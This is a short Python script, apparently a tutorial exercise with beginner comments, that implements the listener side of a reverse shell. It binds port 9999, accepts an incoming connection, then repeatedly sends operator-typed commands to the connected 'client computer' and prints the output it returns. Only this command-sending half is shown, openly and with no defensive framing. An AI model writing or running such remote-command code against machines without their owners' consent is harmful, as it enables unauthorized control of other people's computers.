import socket
import sys   # this library is used for command promt function in python file

# Creates an socket(connecting two computers)
def create_socket():
    try:
        global host   # global declaration of ip address
        global port   # port number
        global s      # socket
        host=""
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

# Binding the socket and listening for connection
def bind_socket():
    try:
        global host  # global declaration of ip address
        global port  # port number
        global s  # socket
        print("Binding the Socket at Port "+str(port))

        s.bind((host,port)) # This consist of a tuple which binds the IP address and Port
        s.listen(5)         # The maximum length of the pending connections queue (no. of bad connection)
    except socket.error as msg:
        print("Socket Binding error: "+str(msg) + "\n" +"Retrying...")
        bind_socket()      # RECURSION: A function call itself in side a same function

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn,address=s.accept()    # address will give a LIST of IP address and Port
    print("Socket connection has been establish! |" + "IP Adrress:" + address[0] +"| Port:" + str(address[1]) )
    send_commands(conn) #sending commands to client computer
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()  # Taking input from the user same as command promt
        if cmd=="quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:     # all the cmd are in the byte format so convert into string encode
            conn.send(str.encode(cmd)) # send the data to the client computer in string format
            client_response=str(conn.recv(1024),'utf-8')    # 1024 = buffer size and utf-8=(8-bit Unicode Transformation Format)
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()